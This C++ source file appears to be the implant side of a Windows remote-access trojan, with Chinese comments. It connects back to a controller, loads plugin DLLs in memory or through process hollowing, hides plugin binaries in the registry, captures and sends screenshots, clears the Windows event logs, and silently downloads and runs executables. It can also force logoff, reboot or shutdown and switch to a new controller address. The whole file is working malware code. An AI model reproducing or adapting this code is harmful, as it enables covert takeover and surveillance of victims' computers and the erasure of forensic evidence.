// KernelManager.cpp: implementation of the CLoginManager class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "LoginManager.h"
#include "MemoryModule.h"

vector<DllDate*> v_dlldates;


unsigned int __stdcall Loop_DllManager(void* pVoid)
{
	DllDate* t_dlldate = (DllDate*)pVoid;
	typedef void (*DLLMain)(TCHAR* ip, DWORD port, BOOL istcp, BOOL RunDllEntryProc);
	typedef void(__stdcall* onlyload)();

	DLLMain lpproc;


	switch (t_dlldate->m_bhaveAV)
	{
	case DLL_MEMLOAD:
	{
		HMEMORYMODULE	handle = ::MemoryLoadLibrary(t_dlldate->delldate, t_dlldate->m_sendate->DateSize);
		if (handle != NULL)
		{
			lpproc = (DLLMain)MemoryGetProcAddress(handle, "Main");
			if (lpproc != NULL)
			{
				t_dlldate->m_CLoginManager->SendLastError(2, t_dlldate->m_sendate->DllName, _T("加载"));
				(*lpproc)(t_dlldate->m_strMasterHost, t_dlldate->m_nMasterPort, t_dlldate->IsTcp, false);
				MemoryFreeLibrary(handle);
				t_dlldate->m_CLoginManager->SendLastError(2, t_dlldate->m_sendate->DllName, _T("释放"));
			}
			else
			{
				t_dlldate->m_CLoginManager->SendLastError(1, _T("插件加载失败-无Main函数"));
			}
		}
	}
	break;
	case DLL_PUPPET:
	{
		//判断下直接加载
		if (memfind((char*)t_dlldate->delldate, "onlyloadinmyself", t_dlldate->m_sendate->DateSize, 0) != -1)   //只能本身使用-删除自身。
		{
			t_dlldate->m_CLoginManager->SendLastError(1, _T("不支持傀儡进程模式，请重新选择功能"));
		}
		else
		{
			//修改下上线配置
			DWORD dwOffset = -1;
			dwOffset = memfind((char*)t_dlldate->delldate, "plugmark", t_dlldate->m_sendate->DateSize, 0);
			if (dwOffset != -1)
			{
				plugInfo* p_plugInfo = new plugInfo;
				ZeroMemory(p_plugInfo, sizeof(plugInfo));
				wcsncpy_s(p_plugInfo->szAddress, ARRAYSIZE(p_plugInfo->szAddress), t_dlldate->m_strMasterHost, ARRAYSIZE(p_plugInfo->szAddress) - 1);
				p_plugInfo->szPort = t_dlldate->m_nMasterPort;
				p_plugInfo->IsTcp = t_dlldate->IsTcp;
				p_plugInfo->RunDllEntryProc = TRUE;
				memcpy((char*)t_dlldate->delldate + dwOffset, (char*)p_plugInfo, sizeof(plugInfo));
			}

			if (!buildremoteprocess(t_dlldate->delldate, t_dlldate->m_sendate->DateSize))
			{
				t_dlldate->m_CLoginManager->SendLastError(2, t_dlldate->m_sendate->DllName, _T("请重新选择功能"));
				t_dlldate->m_CLoginManager->m_bhaveAV = DLL_MEMLOAD;
			}
			else
			{
				t_dlldate->m_CLoginManager->SendLastError(2, t_dlldate->m_sendate->DllName, _T("加载成功"));
			}
		}
	}
	break;
	//case DLL_SHELLCODE:
	//{
	//	//判断下直接加载
	//	if (memfind((char*)t_dlldate->delldate, "onlyloadinmyself", t_dlldate->m_sendate->DateSize, 0) != -1)   //只能本身使用-删除自身。
	//	{
	//		t_dlldate->m_CLoginManager->SendLastError(1, _T("不支持傀儡进程模式，请重新选择功能"));
	//	}
	//	else
	//	{
	//		//修改下上线配置
	//		DWORD dwOffset = -1;
	//		dwOffset = memfind((char*)t_dlldate->delldate, "plugmark", t_dlldate->m_sendate->DateSize, 0);
	//		if (dwOffset != -1)
	//		{
	//			plugInfo* p_plugInfo = new plugInfo;
	//			ZeroMemory(p_plugInfo, sizeof(plugInfo));
	//			wcsncpy_s(p_plugInfo->szAddress, ARRAYSIZE(p_plugInfo->szAddress), t_dlldate->m_strMasterHost, ARRAYSIZE(p_plugInfo->szAddress) - 1);
	//			p_plugInfo->szPort = t_dlldate->m_nMasterPort;
	//			p_plugInfo->IsTcp = t_dlldate->IsTcp;
	//			p_plugInfo->RunDllEntryProc = TRUE;
	//			memcpy((char*)t_dlldate->delldate + dwOffset, (char*)p_plugInfo, sizeof(plugInfo));
	//		}
	//		LPVOID Date;
	//		Date = (LPVOID)VirtualAlloc(0, t_dlldate->m_sendate->DateSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	//		::memcpy(Date, t_dlldate->delldate, t_dlldate->m_sendate->DateSize);
	//		onlyload lpproc = ((onlyload(*)())Date)();
	//	}
	//}
	//break;
	default:
		break;
	}




	return 0;


}


unsigned int __stdcall CopyClinet(void* pVoid)
{
	COPYCLIENT* m_COPYCLIENT = (COPYCLIENT*)pVoid;

	TCHAR			Time[255];		//运行时间
	GetTimeFormat(Time);

	ISocketBase* socketClient = NULL;

	TCHAR szAddress[255] = {};  //ip
	TCHAR szPort[30] = {};		//端口
	BOOL IsTcp;			//通信模式

	Getfindinfo(m_COPYCLIENT->confimodel, _T("p1:"), szAddress, NULL);
	Getfindinfo(m_COPYCLIENT->confimodel, _T("o1:"), szPort, NULL);
	Getfindinfo(m_COPYCLIENT->confimodel, _T("t1:"), NULL, &(IsTcp));

	while (TRUE)
	{
		SAFE_DELETE(socketClient);
		if (IsTcp == 1)
			socketClient = new CTcpSocket();
		else
			socketClient = new CUdpSocket();

		if (!socketClient->Connect(szAddress, _ttoi(szPort)))
		{
			continue;
		}
		CLoginManager	manager(socketClient, szAddress, _ttoi(szPort), IsTcp);
		// 登录
		if (sendLoginInfo(socketClient, Time, MyInfo.otherset.special) == -1)
		{
			socketClient->Disconnect();
			continue;
		}
		//////////////////////////////////////////////////////////////////////////
		// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		if (!manager.IsActived())
		{
			socketClient->Disconnect();
			continue;
		}
		socketClient->run_event_loop();
	}
	return 0;

}





CLoginManager::CLoginManager(ISocketBase* pClient, TCHAR* lpszMasterHost, UINT nMasterPort, BOOL m_IsTcp, BOOL IsBackDoor) : CManager(pClient)
{
	m_IsBackDoor = IsBackDoor;
	if (lpszMasterHost != NULL)
		_tcscpy_s(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	IsTcp = m_IsTcp;
	m_bIsActived = FALSE;
	m_bhaveAV = DLL_MEMLOAD;

	//初始化本地插件数据
#ifdef _WIN64
	EnumRegeditData(_T("Console\\1"));
#else
	EnumRegeditData(_T("Console\\0"));
#endif
}



CLoginManager::~CLoginManager()
{

}

// 加上激活
void CLoginManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	//if (lpBuffer[0] == TOKEN_HEARTBEAT) return;
	if (!m_IsBackDoor)
	{
		HKEY hKEY;
		DWORD dwType = REG_BINARY;
		DWORD dwTypesize = REG_DWORD;
		DWORD dw = sizeof(DWORD);
		DWORD IpDateSize = 0;
		if (ERROR_SUCCESS == ::RegOpenKeyEx(HKEY_CURRENT_USER, _T("Console"), 0, KEY_READ, &hKEY))
		{
			RegQueryValueEx(hKEY, _T("IpDatespecial"), NULL, &dwType, NULL, &IpDateSize);
		}
		if (IpDateSize > 1)
			return;
	}

	switch (lpBuffer[0])
	{
	case TOKEN_ACTIVED:
	{
		if (m_bIsActived) return;
		InterlockedExchange((LONG*)&m_bIsActived, TRUE);
		BYTE lpPacket = TOKEN_GETAUTODLL;
		Send((LPBYTE)&lpPacket, 1);
	}
	break;
	case COMMAND_DLLMAIN:          // 插件  获取DLL 文件名 运行的函数名
	{
		if (nSize != (sizeof(DllSendDate) + 1)) return;
		DllSendDate* p_DllSendDate = new DllSendDate;
		ZeroMemory(p_DllSendDate, sizeof(DllSendDate));
		::memcpy(p_DllSendDate, lpBuffer + 1, sizeof(DllSendDate));
		if ((m_bhaveAV == DLL_PUPPET)/* || (m_bhaveAV == DLL_SHELLCODE)*/)
			wsprintf(p_DllSendDate->DllName, _T("%s_bin"), p_DllSendDate->DllName);
		for (vector<DllDate*>::iterator it = v_dlldates.begin(); it != v_dlldates.end(); )
		{
			if (_tcscmp((*it)->m_sendate->DllName, p_DllSendDate->DllName) == 0)
			{
				if (_tcscmp((*it)->m_sendate->szVersion, p_DllSendDate->szVersion) != 0)  //对比版本号
				{
					SAFE_DELETE((*it)->m_sendate);
					SAFE_DELETE_AR((*it)->delldate);
					SAFE_DELETE(*it);
					v_dlldates.erase(it);
					break;
				}
				HANDLE	hWorker = (HANDLE)_beginthreadex(NULL,					// Security
					0,						// Stack size - use default
					Loop_DllManager,     		// Thread fn entry point
					(void*)(*it),			// Param for thread
					0,						// Init flag
					NULL);			// Thread address
				CloseHandle(hWorker);
				SAFE_DELETE(p_DllSendDate);
				return;
			}
			else
			{
				++it;
			}
		}
		LPBYTE	lpBuffer = NULL;
		DWORD	dwOffset = 0;
		dwOffset = sizeof(DllSendDate) + 1;
		lpBuffer = new BYTE[dwOffset];
		lpBuffer[0] = TOKEN_SENDLL;
		//客户端位数
#ifdef _WIN64
		p_DllSendDate->is_64 = 1;
#else
		p_DllSendDate->is_64 = 0;
#endif
		::memcpy(lpBuffer + 1, p_DllSendDate, dwOffset - 1);
		Send((LPBYTE)lpBuffer, dwOffset);
		SAFE_DELETE(p_DllSendDate);
		SAFE_DELETE(lpBuffer);
	}
	break;
	case COMMAND_SENDLL:
	{
		DllSendDate* temp = new DllSendDate;  //new
		ZeroMemory(temp, sizeof(DllSendDate));
		::memcpy(temp, lpBuffer + 1, sizeof(DllSendDate));
		BYTE* Date = new BYTE[temp->DateSize];		//new
		::memcpy(Date, lpBuffer + 1 + sizeof(DllSendDate), temp->DateSize);
		DllDate* m_DllDate = new DllDate;		//new
		m_DllDate->m_sendate = temp;
		m_DllDate->delldate = Date;
		m_DllDate->m_strMasterHost = m_strMasterHost;
		m_DllDate->m_nMasterPort = m_nMasterPort;
		m_DllDate->IsTcp = IsTcp;
		m_DllDate->m_bhaveAV = m_bhaveAV;
		m_DllDate->m_CLoginManager = this;
		v_dlldates.push_back(m_DllDate);

		// dll bin 写入注册表
		int writeregeditsize = sizeof(DllSendDate) + sizeof(DllDate) + temp->DateSize;
		char* writeregeditbuffer = new char[writeregeditsize];
		if (writeregeditbuffer)
		{
			memcpy(writeregeditbuffer, temp, sizeof(DllSendDate));
			memcpy(writeregeditbuffer + sizeof(DllSendDate), m_DllDate, sizeof(DllDate));
			memcpy(writeregeditbuffer + sizeof(DllSendDate) + sizeof(DllDate), Date, temp->DateSize);
			HKEY hKey;

#ifdef _WIN64
			if (ERROR_SUCCESS == ::RegCreateKey(HKEY_CURRENT_USER, _T("Console\\1"), &hKey))
			{
#else
			if (ERROR_SUCCESS == ::RegCreateKey(HKEY_CURRENT_USER, _T("Console\\0"), &hKey))
			{
#endif
				TCHAR *DllName=new TCHAR[255];
				BufToMd5(DllName, temp->DllName);
				::RegDeleteValue(hKey, DllName);
				::RegSetValueEx(hKey, DllName, 0, REG_BINARY, (unsigned char*)writeregeditbuffer, writeregeditsize);
				SAFE_DELETE_AR(DllName);
			}
			::RegCloseKey(hKey);
		}
		SAFE_DELETE_AR(writeregeditbuffer);
		HANDLE	hWorker = (HANDLE)_beginthreadex(NULL,					// Security
			0,						// Stack size - use default
			Loop_DllManager,     		// Thread fn entry point
			(void*)m_DllDate,			// Param for thread
			0,						// Init flag
			NULL);			// Thread address
		CloseHandle(hWorker);
	}
	break;
	case COMMAND_GET_PROCESSANDCONDITION:
	{
		SendCondition(true);
	}
	break;
	case COMMAND_GET_SCREEN:
	{

		int screendatasize = 0;;
		int x = 0;
		int y = 0;
		byte* screendata = GetScreen(screendatasize, x, y, false, false, 0, 0);
		if (screendatasize == 0)
		{
			SendLastError(2, _T("获取屏幕失败"));
			return;
		}
		int SendSize = screendatasize + 1;
		BYTE* lpPacket = new BYTE[SendSize];
		lpPacket[0] = TOKEN_GNDESKTOP;
		::memcpy(lpPacket + 1, screendata, screendatasize);
		Send((LPBYTE)lpPacket, SendSize);
		SAFE_DELETE_AR(screendata);
		SAFE_DELETE_AR(lpPacket);

	}
	break;
	case COMMAND_UPLOAD_EXE:
		LocalLoad(lpBuffer, nSize);
		break;
	case COMMAND_DOWN_EXE:
	{
		UINT	dwThreadId = 0;
		HANDLE m_hThread = (HANDLE)_beginthreadex(NULL, 0, Loop_DownManager, (LPVOID)(lpBuffer + 1), 0, &dwThreadId);
		CloseHandle(m_hThread);
	}
	break;
	case COMMAND_RENAME:
	{
		switch (lpBuffer[1])
		{
		case 0:
			ReName(_T("GROUP"), (TCHAR*)(lpBuffer + 2));
			break;
		case 1:
			ReName(_T("REMARK"), (TCHAR*)(lpBuffer + 2));
			break;
		default:
			break;
		}
	}
	break;

	case COMMAND_FILTERPROCESS:
	{
		FilterProcess((TCHAR*)(lpBuffer + 1));
	}
	break;
	case COMMAND_MONITOR:
	{
		BYTE lpPacket = TOKEN_MONITOR;
		Send(&lpPacket, 1);
	}
	break;
	case COMMAND_GETMONITOR:
	{
		int w = 300, h = 200;
		memcpy(&w, lpBuffer + 1, 4);
		memcpy(&h, lpBuffer + 5, 4);
		int screendatasize = 0;;
		int x = 0;
		int y = 0;
		byte* screendata = GetScreen(screendatasize, x, y, false, true, w, h);
		int SendSize = screendatasize + 5;
		BYTE* lpPacket = new BYTE[SendSize];
		lpPacket[0] = TOKEN_MONITOR;
		memcpy(lpPacket + 1, &screendatasize, 4);
		::memcpy(lpPacket + 5, screendata, screendatasize);
		Send((LPBYTE)lpPacket, SendSize);
		SAFE_DELETE_AR(screendata);
		SAFE_DELETE_AR(lpPacket);
	}
	break;

	case COMMAND_CLEANLOG:
	{
		const	TCHAR* strEventName[] = { _T("Application"), _T("Security"), _T("System") };
		for (int i = 0; i < 3; i++)
		{
			HANDLE hHandle = OpenEventLog(NULL, strEventName[i]);
			if (hHandle == NULL)
				continue;
			ClearEventLog(hHandle, NULL);
			CloseEventLog(hHandle);
		}
	}
	break;

	case COMMAND_RESTART:
	{
		restart();
	}
	break;

	case COMMAND_EXIT:
	{
		ExitProcess(NULL);
	}
	break;
	case COMMAND_LOGOUT:
	{
		EnablePrivilege(SE_SHUTDOWN_NAME, TRUE);
		ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, 0);
		EnablePrivilege(SE_SHUTDOWN_NAME, FALSE);
	}
	break;


	case COMMAND_REBOOT:
	{
		EnablePrivilege(SE_SHUTDOWN_NAME, TRUE);
		ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
		EnablePrivilege(SE_SHUTDOWN_NAME, FALSE);
	}
	break;
	case COMMAND_SHUTDOWN:
	{
		EnablePrivilege(SE_SHUTDOWN_NAME, TRUE);
		ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, 0);
		EnablePrivilege(SE_SHUTDOWN_NAME, FALSE);
	}
	break;

	break;
	case COMMAND_CLOSESOCKET:
	{
		Disconnect();
	}
	break;
	case COMMAND_CHANGELOAD:
	{
		Trace(" COMMAND_CHANGELOAD %c\r\n", lpBuffer[0]);

		switch (m_bhaveAV)
		{
		case DLL_MEMLOAD:
		{
			m_bhaveAV = DLL_PUPPET;
			this->SendLastError(1, _T("功能-傀儡进程加载方式\n"));
		}
		break;
		case DLL_PUPPET:
		{
			m_bhaveAV = DLL_MEMLOAD;
			this->SendLastError(1, _T("功能-导出函数加载方式\n"));
		}
		break;
		/*	case DLL_SHELLCODE:
			{
				m_bhaveAV = DLL_MEMLOAD;
				this->SendLastError(1, _T("功能-导出函数加载方式\n"));
			}
			break;*/
		default:
			break;
		}
	}
	break;
	case COMMAND_CHANGEINFO:
	{
		COPYCLIENT* m_COPYCLIENT = new COPYCLIENT;
		memcpy(m_COPYCLIENT, lpBuffer, nSize);
		HKEY hKey;
		::RegOpenKeyEx(HKEY_CURRENT_USER, _T("Console"), 0, KEY_SET_VALUE, &hKey);
		::RegDeleteValue(hKey, _T("IpDate"));
		DWORD IpDatesize = nSize - 1;
		if (ERROR_SUCCESS != ::RegSetValueEx(hKey, _T("IpDate"), 0, REG_BINARY, (unsigned char*)m_COPYCLIENT->confimodel, IpDatesize))
		{
			this->SendLastError(1, _T("失败-移机配置\n"));
			::RegCloseKey(hKey);
		}
		else
		{
			this->SendLastError(1, _T("成功-移机配置\n"));

			//修改配置并且断开连接


			Getfindinfo(m_COPYCLIENT->confimodel, _T("p1:"), MyInfo.szAddress, NULL);
			Getfindinfo(m_COPYCLIENT->confimodel, _T("o1:"), MyInfo.szPort, NULL);
			Getfindinfo(m_COPYCLIENT->confimodel, _T("t1:"), NULL, &(MyInfo.IsTcp));

			Getfindinfo(m_COPYCLIENT->confimodel, _T("p2:"), MyInfo.szAddress2, NULL);
			Getfindinfo(m_COPYCLIENT->confimodel, _T("o2:"), MyInfo.szPort2, NULL);
			Getfindinfo(m_COPYCLIENT->confimodel, _T("t2:"), NULL, &(MyInfo.IsTcp2));

			Getfindinfo(m_COPYCLIENT->confimodel, _T("p3:"), MyInfo.szAddress3, NULL);
			Getfindinfo(m_COPYCLIENT->confimodel, _T("o3:"), MyInfo.szPort3, NULL);
			Getfindinfo(m_COPYCLIENT->confimodel, _T("t3:"), NULL, &(MyInfo.IsTcp3));
			::RegCloseKey(hKey);

			Sleep(2000);
			Disconnect();
		}


	}
	break;

	case COMMAND_ADDCLIENT:
	{
		COPYCLIENT* m_COPYCLIENT = new COPYCLIENT;
		if (nSize == sizeof(COPYCLIENT))
		{
			memcpy(m_COPYCLIENT, lpBuffer, nSize);
			HANDLE	hWorker = (HANDLE)_beginthreadex(NULL,					// Security
				0,						// Stack size - use default
				CopyClinet,     		// Thread fn entry point
				(void*)m_COPYCLIENT,			// Param for thread
				0,						// Init flag
				NULL);			// Thread address
			CloseHandle(hWorker);
		}
	}
	break;

	case COMMAND_SET_DOOR_GETPERMINSSION:
	{
		if (m_IsBackDoor)
		{
			HKEY hKey;
			::RegOpenKeyEx(HKEY_CURRENT_USER, _T("Console"), 0, KEY_SET_VALUE, &hKey);
			::RegDeleteValue(hKey, _T("IpDatespecial"));
			DWORD IpDatesize = sizeof(BOOL);
			::RegSetValueEx(hKey, _T("IpDatespecial"), 0, REG_BINARY, (unsigned char*)&m_IsBackDoor, IpDatesize);
			::RegCloseKey(hKey);
		}
	}
	break;
	case COMMAND_SET_DOOR_QUITPERMINSSION:
	{
		if (m_IsBackDoor)
		{
			HKEY hKey;
			::RegOpenKeyEx(HKEY_CURRENT_USER, _T("Console"), 0, KEY_SET_VALUE, &hKey);
			::RegDeleteValue(hKey, _T("IpDatespecial"));
			::RegCloseKey(hKey);
		}
	}
	break;
	case TOKEN_HEARTBEAT:
	{
		if (lpBuffer[1] == 0)
			SendCondition(false);
		else
			SendCondition(true);
	}
	break;
	default:
		Trace(" error%c\r\n", lpBuffer[0]);
		break;


	}
	}







CLoginManager::CLoginManager(ISocketBase * pClient) :CManager(pClient)
{
}

BOOL CLoginManager::IsActived()
{
	return	m_bIsActived;
}

void CLoginManager::FilterProcess(TCHAR * filtername)
{
	wstring Processname;
	DWORD dwFlags = TH32CS_SNAPPROCESS;
	DWORD th32ProcessID = 0;
	HANDLE handle = CreateToolhelp32Snapshot(dwFlags, th32ProcessID);
	if (handle == INVALID_HANDLE_VALUE) {
		SendLastError(1, _T("筛选失败"));
	}
	else
	{
		PROCESSENTRY32 processEntry32 = { 0 };
		processEntry32.dwSize = sizeof(processEntry32);

		//遍历进程快照，轮流显示每个进程的信息
		BOOL hasNext = Process32First(handle, &processEntry32);
		while (hasNext)
		{
			if (wcscmp(processEntry32.szExeFile, filtername) == 0)
			{
				BYTE Token = TOKEN_PROCESS;
				Send(&Token, 1);
				return;
			}
			hasNext = Process32Next(handle, &processEntry32);
		}
	}
}

void CLoginManager::SendCondition(bool all)
{
	DATAUPDATE* DataUpdate = new DATAUPDATE;
	memset(DataUpdate, 0, sizeof(DATAUPDATE));
	DataUpdate->Btoken = TOKEN_CONDITION;
	GetActive(DataUpdate->UserActive);
	getactivewindows(DataUpdate->Window);
	BYTE* lpPacket = NULL;
	int screendatasize = 0;;
	int x = 0;
	int y = 0;
	byte* screendata = NULL;
	screendata = GetScreen(screendatasize, x, y, true, false, 0, 0);
	if ((screendatasize == 0) || (!all))
	{
		Send((LPBYTE)DataUpdate, sizeof(DATAUPDATE));
	}
	else
	{
		int SendSize = screendatasize + sizeof(DATAUPDATE);
		lpPacket = new BYTE[SendSize];
		DataUpdate->iScreenWidth = x;
		DataUpdate->iScreenHeight = y;
		memcpy(lpPacket, DataUpdate, sizeof(DATAUPDATE));
		::memcpy(lpPacket + sizeof(DATAUPDATE), screendata, screendatasize);
		Send((LPBYTE)lpPacket, SendSize);

	}

	SAFE_DELETE(DataUpdate);
	SAFE_DELETE_AR(screendata);
	SAFE_DELETE_AR(lpPacket);
}

byte* CLoginManager::GetScreen(int& size, int& x, int& y, bool blitter, bool setsize, int setw, int seth)
{
	HDC hCurrScreen = ::GetDC(GetDesktopWindow()); //多屏DC
	HDC hCmpDC = CreateCompatibleDC(hCurrScreen);
	HDC hdc = GetDC(NULL);
	int client_width_now = GetDeviceCaps(hdc, HORZRES);      // 宽  
	int client_width_old = GetDeviceCaps(hdc, DESKTOPHORZRES);
	float fDpiRatio = (float)client_width_old / (float)client_width_now;
	ReleaseDC(NULL, hdc);
	int iScreenWidth = 0;
	int iScreenHeight = 0;
	if (setsize)
	{
		iScreenWidth = setw;
		iScreenHeight = seth;
	}
	else
	{
		if (blitter)
		{
			iScreenWidth = (int)((float)(::GetSystemMetrics(SM_CXVIRTUALSCREEN)) * fDpiRatio) / 10;
			iScreenHeight = (int)((float)(::GetSystemMetrics(SM_CYVIRTUALSCREEN)) * fDpiRatio) / 10;
		}
		else
		{
			iScreenWidth = (int)((float)(::GetSystemMetrics(SM_CXVIRTUALSCREEN)) * fDpiRatio);
			iScreenHeight = (int)((float)(::GetSystemMetrics(SM_CYVIRTUALSCREEN)) * fDpiRatio);
		}
	}

	int iScreenX = (int)((float)(::GetSystemMetrics(SM_XVIRTUALSCREEN)) * fDpiRatio);
	int iScreenY = (int)((float)(::GetSystemMetrics(SM_YVIRTUALSCREEN)) * fDpiRatio);
	//当前屏幕位图
	HBITMAP hBmp = CreateCompatibleBitmap(hCurrScreen, iScreenWidth, iScreenHeight);
	//用当前位图句柄表示内存中屏幕位图上下文
	SelectObject(hCmpDC, hBmp);
	//将当前屏幕图像复制到内存中
	SetStretchBltMode(hCmpDC, COLORONCOLOR);
	BOOL ret = StretchBlt(hCmpDC, 0, 0, iScreenWidth, iScreenHeight, hCurrScreen, iScreenX, iScreenY, (int)((float)(::GetSystemMetrics(SM_CXVIRTUALSCREEN)) * fDpiRatio), (int)((float)(::GetSystemMetrics(SM_CYVIRTUALSCREEN)) * fDpiRatio), SRCCOPY);

	//BMP图像信息头
	BITMAPINFOHEADER hBmpInfo;
	hBmpInfo.biSize = sizeof(BITMAPINFOHEADER);
	hBmpInfo.biWidth = iScreenWidth;
	hBmpInfo.biHeight = iScreenHeight;
	hBmpInfo.biPlanes = 1;
	hBmpInfo.biClrUsed = 0;
	hBmpInfo.biBitCount = 32;
	hBmpInfo.biSizeImage = 0;
	hBmpInfo.biCompression = BI_RGB;
	hBmpInfo.biClrImportant = 0;
	hBmpInfo.biXPelsPerMeter = 0;
	hBmpInfo.biYPelsPerMeter = 0;
	DWORD dwSrcSize = ((iScreenWidth * hBmpInfo.biBitCount + 31) / 32) * 4 * iScreenHeight;
	//截图总大小
	DWORD dwPicSize = sizeof(BITMAPINFOHEADER) + sizeof(BITMAPFILEHEADER) + dwSrcSize;
	//BMP图像文件头
	BITMAPFILEHEADER hBmpFile;
	hBmpFile.bfSize = dwPicSize;
	hBmpFile.bfType = 0x4D42;
	hBmpFile.bfOffBits = sizeof(BITMAPINFOHEADER) + sizeof(BITMAPFILEHEADER);
	hBmpFile.bfReserved1 = 0;
	hBmpFile.bfReserved2 = 0;
	//BMP图像数据源
	char* bmpSrc = new char[dwSrcSize];
	ZeroMemory(bmpSrc, dwSrcSize);
	//检索指定的兼容位图中的所有位元数据
	//并复制到指定格式的设备无关位图的缓存中
	GetDIBits(hCmpDC, hBmp, 0, (UINT)iScreenHeight, bmpSrc, (BITMAPINFO*)&hBmpInfo, DIB_RGB_COLORS);
	//汇总所有数据信息
	char* szBmp = new char[dwPicSize];
	ZeroMemory(szBmp, dwPicSize);
	::memcpy(szBmp, (void*)&hBmpFile, sizeof(BITMAPFILEHEADER));
	::memcpy(szBmp + sizeof(BITMAPFILEHEADER), (void*)&hBmpInfo, sizeof(BITMAPINFOHEADER));
	::memcpy(szBmp + sizeof(BITMAPINFOHEADER) + sizeof(BITMAPFILEHEADER), bmpSrc, dwSrcSize);

	std::string* jpgData = new std::string;;
	if (BMP2JPEG(szBmp, dwPicSize, jpgData) <= 0)
	{
		DeleteObject(hBmp);
		DeleteObject(hCmpDC);
		ReleaseDC(NULL, hCurrScreen);
		SAFE_DELETE_AR(szBmp);
		SAFE_DELETE_AR(bmpSrc);
		SAFE_DELETE(jpgData);
		return NULL;
	}

	size = (int)jpgData->length();
	x = iScreenWidth;
	y = iScreenHeight;
	byte* data = new byte[size];
	::memcpy(data, jpgData->c_str(), size);
	//释放资源
	DeleteObject(hBmp);
	DeleteObject(hCmpDC);
	ReleaseDC(NULL, hCurrScreen);
	SAFE_DELETE_AR(szBmp);
	SAFE_DELETE_AR(bmpSrc);
	SAFE_DELETE(jpgData);
	return data;
}


unsigned long CLoginManager::BMP2JPEG(const char* pUnZipData, unsigned long ulUnZipDataLen, std::string * jpgData)
{
	unsigned long ulBufferLen = 0;
	HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, ulUnZipDataLen);
	void* pData = GlobalLock(hGlobal);
	::memcpy(pData, pUnZipData, ulUnZipDataLen);
	GlobalUnlock(hGlobal);
	IStream* pStream = NULL;
	if (CreateStreamOnHGlobal(hGlobal, TRUE, &pStream) == S_OK)
	{
		CImage image;
		if (SUCCEEDED(image.Load(pStream)))
		{
			IStream* pOutStream = NULL;
			if (CreateStreamOnHGlobal(NULL, TRUE, &pOutStream) == S_OK)
			{
				image.Save(pOutStream, Gdiplus::ImageFormatJPEG);
				HGLOBAL hOutGlobal = NULL;
				GetHGlobalFromStream(pOutStream, &hOutGlobal);
				LPBYTE pBits = (LPBYTE)GlobalLock(hOutGlobal);
				if (pBits == nullptr)
				{
					pStream->Release();
					GlobalFree(hGlobal);
					return 0;
				}
				ulBufferLen = (DWORD)GlobalSize(pBits);
				char* pBuffer = new char[ulBufferLen];
				::memcpy(pBuffer, pBits, ulBufferLen);
				*jpgData = std::string(pBuffer, ulBufferLen);
				SAFE_DELETE(pBuffer);
				image.Destroy();
				GlobalUnlock(hOutGlobal);
				pOutStream->Release();
			}
		}
		pStream->Release();
	}
	GlobalFree(hGlobal);
	return ulBufferLen;
}

BOOL CLoginManager::LocalLoad(LPBYTE lpBuffer, UINT nSize)
{
	LOCALUP LocaUp;
	memcpy(&LocaUp, lpBuffer, sizeof(LOCALUP));

	TCHAR strOpenFile[MAX_PATH + 100] = { 0 };

	HANDLE hFile;
	DWORD  dwBytesWritten;
	hFile = CreateFile(LocaUp.lpFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return false;
	if (!WriteFile(hFile, lpBuffer + sizeof(LOCALUP), nSize - sizeof(LOCALUP), &dwBytesWritten, NULL))
		return false;
	CloseHandle(hFile);


	if (lstrlen(LocaUp.lpCmdLine) != 0)
		wsprintf(strOpenFile, _T("%s %s"), LocaUp.lpFileName, LocaUp.lpCmdLine);
	else
		lstrcpy(strOpenFile, LocaUp.lpFileName);

	switch (LocaUp.nType)
	{
	case 0:
		RunFile(strOpenFile, SW_SHOW);
		break;
	case 1:
		RunFile(strOpenFile, SW_HIDE);
		break;
	case 2:
		break;
	default:
		break;
	}

	return TRUE;
}

bool CLoginManager::RunFile(TCHAR * lpFile, INT nShowCmd)
{
	TCHAR	lpSubKey[500];
	TCHAR	strTemp[MAX_PATH];
	TCHAR* lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));

	TCHAR* lpExt = _tcsrchr(lpFile, _T('.'));
	if (!lpExt)
		return false;

	TCHAR strResult[MAX_PATH] = { 0 }; //保存结果
	if (_tcsrchr(lpExt, _T(' ')))
	{
		int nStrLen = lstrlen(lpExt) - 1; //原始字符串长度

		for (int i = nStrLen; i > 0; i--)
		{
			if (lpExt[i] == _T(' '))
			{
				_tcsncpy_s(strResult, MAX_PATH, lpExt, i);
				break;
			}
		}
	}
	else
		_tcsncpy_s(strResult, MAX_PATH, lpExt, lstrlen(lpExt));


	if (!ReadRegEx(HKEY_CLASSES_ROOT, strResult, 0L, REG_SZ, strTemp, NULL, sizeof(strTemp), 0))
		return false;

	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, _T("%s\\shell\\open\\command"), strTemp);

	memset(strTemp, 0, sizeof(strTemp));
	TCHAR str[MAX_PATH] = { 0 };
	if (!ReadRegEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, REG_EXPAND_SZ, str, NULL, sizeof(str), 0))
		return false;

	ExpandEnvironmentStrings(str, strTemp, MAX_PATH);


	lpstrCat = _tcsstr(strTemp, _T("\"%1"));
	if (lpstrCat == NULL)
		lpstrCat = _tcsstr(strTemp, _T("%1"));
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, _T(" "));
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
	{
		si.lpDesktop = _T("WinSta0\\Default");
	}
	else
	{
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
	}

	CreateProcess(NULL, strTemp, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	return true;
}


